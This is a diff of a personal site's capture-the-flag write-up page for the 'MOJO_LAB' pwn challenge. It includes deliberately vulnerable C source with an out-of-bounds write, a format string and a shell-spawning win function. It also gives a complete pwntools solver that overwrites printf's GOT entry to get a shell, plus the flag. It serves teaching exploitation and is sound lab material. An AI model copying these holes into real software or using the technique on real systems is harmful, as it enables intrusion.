@@ -1,250 +1,66 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MOJO_LAB // r3t0x</title>
-    <link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
-    <meta name="description" content="">
-    <link rel="stylesheet" href="../../../../static/css/style.css?v=43fea522e0ce">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0c0c0e">
+<title>MOJO_LAB — MOJO-JOJO CTF — r3t0x</title>
+<meta name="description" content="MOJO-JOJO CTF pwn challenge.">
+<meta name="author" content="Ghaith Amdouni">
+<link rel="canonical" href="https://r3t0x.me/challenge/mojo-jojo/pwn/MOJO_LAB/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MOJO_LAB — MOJO-JOJO CTF — r3t0x">
+<meta property="og:description" content="MOJO-JOJO CTF pwn challenge.">
+<meta property="og:url" content="https://r3t0x.me/challenge/mojo-jojo/pwn/MOJO_LAB/">
+<meta property="og:image" content="https://r3t0x.me/static/img/social-card.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
+<link rel="alternate" type="application/rss+xml" title="r3t0x — writeups" href="/feed.xml">
+<link rel="stylesheet" href="/static/css/main.css?v=f322459a0a">
+<script src="/static/js/main.js?v=f322459a0a" defer></script>
 </head>
 <body>
-    <!-- Genjutsu Transition Overlay -->
-    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
-        <div class="eyelid eyelid-top"></div>
-        <div class="eyelid eyelid-bottom"></div>
-        <div class="genjutsu-eye">
-                <svg viewBox="0 0 200 200">
-                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
-                    <!-- Base 3-Tomoe -->
-                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
-                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
-                        <circle cx="100" cy="100" r="16" fill="#000"/>
-                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
-                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                    </g>
-                    <!-- Uploaded Image Mangekyo -->
-                    <defs>
-                        <clipPath id="circleClip">
-                            <circle cx="100" cy="100" r="98" />
-                        </clipPath>
-                    </defs>
-                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
-                </svg>
-        </div>
-    </div>
-    <div class="scanlines"></div>
-    <div class="scroll-indicator" id="scrollIndicator"></div>
-    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
-    <div class="pwndbg-bg" id="pwndbgBg"></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="masthead">
+  <div class="shell">
+    <a class="brand" href="/"><img class="mark" src="/static/img/mangekyou.png" alt="" width="20" height="20" loading="lazy" decoding="async"><span>r3t0x</span></a>
+    <nav aria-label="Main"><a href="/">home</a><a href="/blog/" aria-current="page">writeups</a><a href="/projects/">projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>cv</a></nav>
+    <button type="button" class="search-open" data-open-search aria-label="Search the site">search<kbd>/</kbd></button>
+  </div>
+</header>
+<main id="main"><div class="shell narrow"><article class="writeup">
+  <header class="page-head">
+    <p class="kicker"><a href="/blog/#mojo-jojo-ctf">MOJO-JOJO CTF</a> / pwn</p>
+    <h1>MOJO_LAB</h1>
+    <p class="lede">MOJO-JOJO CTF pwn challenge.</p>
+    <dl class="facts">
+      <div><dt>difficulty</dt><dd>hard</dd></div>
+      <div><dt>points</dt><dd>—</dd></div>
+      <div><dt>published</dt><dd><time datetime="2026-09-28">28 Sept 2026</time></dd></div>
+      <div><dt>author</dt><dd>r3t0x</dd></div>
+    </dl>
+    <p class="tags"><span>OOB Write + GOT Overwrite</span></p>
+  </header>
+  <nav class="toc" aria-label="On this page"><p>contents</p><ol><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#vulnerabilities">Vulnerabilities</a></li><li><a href="#strategy">Strategy</a></li><li><a href="#result">Result</a></li><li><a href="#solver">Reference solver</a></li><li><a href="#flag">Flag</a></li></ol></nav>
+  <div class="prose">
+    <h2 id="reconnaissance">Reconnaissance</h2>
+<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>pwndbg&gt; checksec ./main
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre></figure>
 
-    <div class="container" style="gap: 40px;">
-
-        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
-
-        <div class="chall-header">
-            <h1><span class="prefix">./</span>MOJO_LAB<span class="cursor-blink">_</span></h1>
-            <div class="chall-meta-row">
-                <span class="tag">PWN</span>
-                <span>MOJO-JOJO CTF</span>
-                <span>0xc199e3d4</span>
-                <span>by r3t0x&#34;</span>
-                
-                <span>
-                    <span class="difficulty">
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                    </span>
-                </span>
-            </div>
-        </div>
-
-        <!-- Description -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DESCRIPTION</div>
-            <div class="code-block">
-                
-            </div>
-        </div>
-
-
-
-        
-        <!-- Source Code / Disasm -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DISASM // SOURCE</div>
-            
-            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// main.c</div>
-            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;string.h&gt;
-
-/* 
-   MOJO JOJO&#39;S LAZY LAB
-   &#34;I Mojo Jojo shall defeat the Powerpuff Girls with my Lazy Linker!&#34;
-*/
-
-// Global buffers
-char chemical_x[100];
-long dna_sequences[10];
-
-void lab_win() {
-    const char *msg = &#34;\n[MOJO JOJO]: NOOOOO! You have compromised my laboratory!\n&#34;;
-    write(1, msg, strlen(msg));
-    system(&#34;/bin/sh&#34;);
-    exit(0);
-}
-
-void setup() {
-    setvbuf(stdin, NULL, _IONBF, 0);
-    setvbuf(stdout, NULL, _IONBF, 0);
-    setvbuf(stderr, NULL, _IONBF, 0);
-}
-
-void print_str(const char *s) {
-    write(1, s, strlen(s));
-}
-
-void banner() {
-    print_str(&#34;        _---_        \n&#34;);
-    print_str(&#34;       /     \\      \n&#34;);
-    print_str(&#34;      | () () |     \n&#34;);
-    print_str(&#34;       \\  ^  /      \n&#34;);
-    print_str(&#34;        |||||       \n&#34;);
-    print_str(&#34;      /-------\\     \n&#34;);
-    print_str(&#34;     | MOJO JO |    \n&#34;);
-    print_str(&#34;     |   LAB   |    \n&#34;);
-    print_str(&#34;      \\_______/     \n&#34;);
-    print_str(&#34;\n[MOJO JOJO]: Welcome to my secret laboratory!\n&#34;);
-    print_str(&#34;I, Mojo Jojo, am the most brilliant monkey in the world!\n\n&#34;);
-}
-
-int get_input() {
-    char buf[16];
-    if (fgets(buf, sizeof(buf), stdin) == NULL) exit(0);
-    return atoi(buf);
-}
-
-int main() {
-    setup();
-    banner();
-    
-    print_str(&#34;[LAB-SCANNER]: Input your Chemical X formula: &#34;);
-    if (fgets(chemical_x, sizeof(chemical_x), stdin) == NULL) exit(0);
-    
-    if (strchr(chemical_x, &#39;%&#39;)) {
-        print_str(&#34;[MOJO JOJO]: CURSES! Powerpuff Girls trickery detected!\n&#34;);
-        exit(1);
-    }
-
-    while(1) {
-        print_str(&#34;\n--- Laboratory Terminal ---\n&#34;);
-        print_str(&#34;1. Modify DNA Sequence\n&#34;);
-        print_str(&#34;2. Synthesize Chemical X\n&#34;);
-        print_str(&#34;3. Abandon Laboratory\n&#34;);
-        print_str(&#34;&gt; &#34;);
-        
-        int choice = get_input();
-        
-        if (choice == 1) { // DNA Modification (OOB Write)
-            print_str(&#34;DNA Slot Index: &#34;);
-            int idx = get_input();
-            print_str(&#34;Base Pair Value: &#34;);
-            int val = get_input();
-            
-            unsigned short *modifier = (unsigned short*)dna_sequences;
-            // The Monkey Math: XOR the index to hide the target
-            modifier[idx ^ 0x7050] = (unsigned short)val;
-            
-            print_str(&#34;[LAB]: DNA sequence updated successfully.\n&#34;);
-        } 
-        else if (choice == 2) { // Synthesis (Echo/Printf)
-            print_str(&#34;[SYNTHESIZER]: Processing formula: &#34;);
-            // This is where the GOT overwrite pays off.
-            // Using printf here ensures the exploit only triggers when requested.
-            printf(chemical_x); 
-            print_str(&#34;\nSynthesis complete.\n&#34;);
-        }
-        else {
-            print_str(&#34;[MOJO JOJO]: I shall return! FAREWELL!\n&#34;);
-            exit(0);
-        }
-    }
-    return 0;
-}
-</pre>
-            </div>
-            
-        </div>
-        
-
-        
-        <!-- Writeup -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
-            <div class="writeup-content">
-                <h1>MOJO LAB — Writeup</h1>
-<h2>Challenge Overview</h2>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Category</strong></td>
-<td>PWN</td>
-</tr>
-<tr>
-<td><strong>Difficulty</strong></td>
-<td>Hard</td>
-</tr>
-<tr>
-<td><strong>Author</strong></td>
-<td>r3t0x</td>
-</tr>
-<tr>
-<td><strong>Technique</strong></td>
-<td>OOB Write + GOT Overwrite</td>
-</tr>
-</tbody>
-</table>
-<h2>Reconnaissance</h2>
-<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./main
-<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
-<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
-<span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
-<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
-<span class="w">    </span>PIE:<span class="w">      </span>PIE<span class="w"> </span>enabled
-</code></pre></div>
-
-<h2>Vulnerabilities</h2>
-<h3>1. OOB Write via XOR Index</h3>
-<div class="codehilite"><pre><span></span><code><span class="n">modifier</span><span class="p">[</span><span class="n">idx</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0x7050</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">short</span><span class="p">)</span><span class="n">val</span><span class="p">;</span>
-</code></pre></div>
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<h3 id="1-oob-write-via-xor-index">1. OOB Write via XOR Index</h3>
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>modifier[idx ^ 0x7050] = (unsigned short)val;</code></pre></figure>
 
 <p>The index is XOR'd with <code>0x7050</code> before use. By choosing <code>idx</code> carefully, we can write a 16-bit value <strong>anywhere relative to <code>dna_sequences</code></strong> — including the GOT.</p>
-<h3>2. Format String in Chemical X</h3>
-<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="n">chemical_x</span><span class="p">);</span><span class="w">  </span><span class="c1">// controlled input!</span>
-</code></pre></div>
+<h3 id="2-format-string-in-chemical-x">2. Format String in Chemical X</h3>
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>printf(chemical_x);  // controlled input!</code></pre></figure>
 
 <p>The <code>'%'</code> character is filtered from <code>chemical_x</code>, but the OOB write lets us overwrite GOT entries (e.g., <code>printf@got → lab_win</code>).</p>
-<h2>Strategy</h2>
+<h2 id="strategy">Strategy</h2>
 <ol>
 <li>Calculate the offset from <code>dna_sequences</code> to <code>printf@got</code></li>
 <li>XOR that index with <code>0x7050</code> to get the required input index</li>
@@ -252,99 +68,102 @@ int main() {
 <li>Trigger option 2 ("Synthesize Chemical X") → calls <code>printf(chemical_x)</code> → now jumps to <code>lab_win()</code></li>
 <li><code>lab_win()</code> calls <code>system("/bin/sh")</code></li>
 </ol>
-<h2>Result</h2>
-<div class="codehilite"><pre><span></span><code><span class="p">[</span><span class="n">MOJO</span><span class="w"> </span><span class="n">JOJO</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="n">NOOOOO</span><span class="o">!</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">compromised</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">laboratory</span><span class="o">!</span>
-<span class="n">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
-<span class="n">MOJO</span><span class="o">-</span><span class="n">JOJO</span><span class="p">{</span><span class="n">m0j0_l4b_0wn3d</span><span class="p">}</span>
-</code></pre></div>
-            </div>
-        </div>
-        
+<h2 id="result">Result</h2>
+<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>[MOJO JOJO]: NOOOOO! You have compromised my laboratory!
+$ cat flag.txt
+MOJO-JOJO{m0j0_l4b_0wn3d}</code></pre></figure>
+    <h2 id="solver">Reference solver</h2>
+    <figure class="code"><figcaption><span>solve.py</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-python"><span class="t-k">from</span> pwn <span class="t-k">import</span> *
+<span class="t-k">import</span> sys
 
-        
-        <!-- Exploit / Solver -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
-            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
-                <span style="color: var(--gdb-green);">$</span> python3 solve.py
-            </div>
-            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
-import sys
+<span class="t-c"># Set context</span>
+context.binary = binary = <span class="t-f">ELF</span>(<span class="t-s">'./main'</span>)
+context.log_level = <span class="t-s">'info'</span>
 
-# Set context
-context.binary = binary = ELF(&#39;./main&#39;)
-context.log_level = &#39;info&#39;
+<span class="t-k">if</span> args.REMOTE:
+    host = args.HOST <span class="t-k">or</span> <span class="t-s">'4.233.210.175'</span>
+    port = <span class="t-f">int</span>(args.PORT <span class="t-k">or</span> <span class="t-m">9007</span>)
+    p = <span class="t-f">remote</span>(host, port)
+<span class="t-k">else</span>:
+    p = <span class="t-f">process</span>(<span class="t-s">'./main'</span>)
 
-if args.REMOTE:
-    host = args.HOST or &#39;4.233.210.175&#39;
-    port = int(args.PORT or 9007)
-    p = remote(host, port)
-else:
-    p = process(&#39;./main&#39;)
+<span class="t-k">def</span> <span class="t-f">get_menu</span>():
+    p.<span class="t-f">recvuntil</span>(b<span class="t-s">'&gt; '</span>)
 
-def get_menu():
-    p.recvuntil(b&#39;&gt; &#39;)
+<span class="t-k">def</span> <span class="t-f">write_val</span>(idx, val):
+    <span class="t-f">get_menu</span>()
+    p.<span class="t-f">sendline</span>(b<span class="t-s">'1'</span>) <span class="t-c"># Modify DNA Sequence</span>
+    p.<span class="t-f">recvuntil</span>(b<span class="t-s">'DNA Slot Index: '</span>)
+    <span class="t-c"># The Monkey Math: inverse the XOR to hit the target</span>
+    p.<span class="t-f">sendline</span>(<span class="t-f">str</span>(idx ^ <span class="t-m">0x7050</span>).<span class="t-f">encode</span>())
+    p.<span class="t-f">recvuntil</span>(b<span class="t-s">'Base Pair Value: '</span>)
+    p.<span class="t-f">sendline</span>(<span class="t-f">str</span>(val).<span class="t-f">encode</span>())
+    p.<span class="t-f">recvuntil</span>(b<span class="t-s">'[LAB]: DNA sequence updated successfully.\n'</span>)
 
-def write_val(idx, val):
-    get_menu()
-    p.sendline(b&#39;1&#39;) # Modify DNA Sequence
-    p.recvuntil(b&#39;DNA Slot Index: &#39;)
-    # The Monkey Math: inverse the XOR to hit the target
-    p.sendline(str(idx ^ 0x7050).encode())
-    p.recvuntil(b&#39;Base Pair Value: &#39;)
-    p.sendline(str(val).encode())
-    p.recvuntil(b&#39;[LAB]: DNA sequence updated successfully.\n&#39;)
+<span class="t-k">def</span> <span class="t-f">trigger</span>():
+    <span class="t-f">get_menu</span>()
+    p.<span class="t-f">sendline</span>(b<span class="t-s">'2'</span>) <span class="t-c"># Synthesize Chemical X</span>
 
-def trigger():
-    get_menu()
-    p.sendline(b&#39;2&#39;) # Synthesize Chemical X
+<span class="t-c"># Exploit Logic</span>
+<span class="t-c"># 1. Target: printf@GOT</span>
+<span class="t-c"># 2. Value: lab_win() address</span>
+<span class="t-c"># 3. Primitive: 2-byte write via 'unsigned short' array</span>
 
-# Exploit Logic
-# 1. Target: printf@GOT
-# 2. Value: lab_win() address
-# 3. Primitive: 2-byte write via &#39;unsigned short&#39; array
+<span class="t-c"># Note: In the new main.c, global names are chemical_x and dna_sequences</span>
+got_printf = binary.got[<span class="t-s">'printf'</span>]
+sym_dna = binary.symbols[<span class="t-s">'dna_sequences'</span>]
+sym_win = binary.symbols[<span class="t-s">'lab_win'</span>]
 
-# Note: In the new main.c, global names are chemical_x and dna_sequences
-got_printf = binary.got[&#39;printf&#39;]
-sym_dna = binary.symbols[&#39;dna_sequences&#39;]
-sym_win = binary.symbols[&#39;lab_win&#39;]
+log.<span class="t-f">info</span>(f<span class="t-s">&quot;printf@GOT: {hex(got_printf)}&quot;</span>)
+log.<span class="t-f">info</span>(f<span class="t-s">&quot;dna_sequences: {hex(sym_dna)}&quot;</span>)
+log.<span class="t-f">info</span>(f<span class="t-s">&quot;lab_win: {hex(sym_win)}&quot;</span>)
 
-log.info(f&#34;printf@GOT: {hex(got_printf)}&#34;)
-log.info(f&#34;dna_sequences: {hex(sym_dna)}&#34;)
-log.info(f&#34;lab_win: {hex(sym_win)}&#34;)
-
-# Calculate start index
-# dna_sequences + i * 2 = got_printf =&gt; i = (got_printf - dna_sequences) / 2
-idx_start = (got_printf - sym_dna) // 2
-log.info(f&#34;Index start: {idx_start}&#34;)
+<span class="t-c"># Calculate start index</span>
+<span class="t-c"># dna_sequences + i * 2 = got_printf =&gt; i = (got_printf - dna_sequences) / 2</span>
+idx_start = (got_printf - sym_dna) // <span class="t-m">2</span>
+log.<span class="t-f">info</span>(f<span class="t-s">&quot;Index start: {idx_start}&quot;</span>)
 
 chunks = [
-    (sym_win &gt;&gt; 0) &amp; 0xFFFF,
-    (sym_win &gt;&gt; 16) &amp; 0xFFFF,
-    (sym_win &gt;&gt; 32) &amp; 0xFFFF,
-    (sym_win &gt;&gt; 48) &amp; 0xFFFF
+    (sym_win &gt;&gt; <span class="t-m">0</span>) &amp; <span class="t-m">0xFFFF</span>,
+    (sym_win &gt;&gt; <span class="t-m">16</span>) &amp; <span class="t-m">0xFFFF</span>,
+    (sym_win &gt;&gt; <span class="t-m">32</span>) &amp; <span class="t-m">0xFFFF</span>,
+    (sym_win &gt;&gt; <span class="t-m">48</span>) &amp; <span class="t-m">0xFFFF</span>
 ]
 
-p.recvuntil(b&#39;Input your Chemical X formula: &#39;)
-p.sendline(b&#34;HELLO-MOJO&#34;) # Initial formula
+p.<span class="t-f">recvuntil</span>(b<span class="t-s">'Input your Chemical X formula: '</span>)
+p.<span class="t-f">sendline</span>(b<span class="t-s">&quot;HELLO-MOJO&quot;</span>) <span class="t-c"># Initial formula</span>
 
-for i, chunk in enumerate(chunks):
-    log.info(f&#34;Writing chunk {i}: {hex(chunk)} at idx {idx_start + i}&#34;)
-    write_val(idx_start + i, chunk)
+<span class="t-k">for</span> i, chunk <span class="t-k">in</span> <span class="t-f">enumerate</span>(chunks):
+    log.<span class="t-f">info</span>(f<span class="t-s">&quot;Writing chunk {i}: {hex(chunk)} at idx {idx_start + i}&quot;</span>)
+    <span class="t-f">write_val</span>(idx_start + i, chunk)
 
-log.info(&#34;Triggering synthesized formula...&#34;)
-trigger()
+log.<span class="t-f">info</span>(<span class="t-s">&quot;Triggering synthesized formula...&quot;</span>)
+<span class="t-f">trigger</span>()
 
-p.interactive()
-</pre>
-            </div>
-        </div>
-        
-
-        <div style="height: 80px;"></div>
-    </div>
-
-    <script src="../../../../static/js/main.js?v=43fea522e0ce"></script>
+p.<span class="t-f">interactive</span>()</code></pre></figure>
+    <h2 id="flag">Flag</h2>
+    <p class="flag"><code>MOJO-JOJO{m0j0_l4b_0wn3d}</code><button type="button" class="copy" data-copy>copy</button></p>
+  </div>
+  <nav class="pager" aria-label="More writeups">
+    <a href="/challenge/mojo-jojo/pwn/oracle_Revenge/"><span>previous</span><strong>Two Echoes - Revenge</strong></a>
+    <span></span>
+  </nav>
+</article></div></main>
+<footer class="colophon">
+  <div class="shell">
+    <p><strong>Ghaith Amdouni</strong> · Binary exploitation &amp; systems · Tunis, Tunisia</p>
+    <nav aria-label="Elsewhere"><a href="https://github.com/Ghaith-amdouni">GitHub</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn</a><a href="https://www.credly.com/users/ghaith-amdouni">Credly</a><a href="/feed.xml">RSS</a><a href="mailto:ghaith.amdouni@insat.ucar.tn">email</a></nav>
+    <p class="fine">© 2026 Ghaith Amdouni · <a href="https://github.com/Ghaith-amdouni/ghaith-amdouni.github.io">site source</a><img class="hits" src="https://hits.sh/r3t0x.me.svg?view=total&style=flat-square&label=visits&color=161619&labelColor=0c0c0e" alt="" width="88" height="20" loading="lazy"></p>
+  </div>
+</footer>
+<dialog id="search" aria-label="Search">
+  <form method="dialog" class="search-head">
+    <label for="search-input"><span aria-hidden="true">&gt;</span><span class="sr-only">Search writeups, projects and pages</span></label>
+    <input id="search-input" type="search" placeholder="search writeups, projects, pages" autocomplete="off" spellcheck="false">
+    <button value="close" aria-label="Close search">esc</button>
+  </form>
+  <ul id="search-results"></ul>
+  <p class="search-foot"><span id="search-count">start typing</span><span>&uarr;&darr; move · enter open</span></p>
+</dialog>
 </body>
 </html>
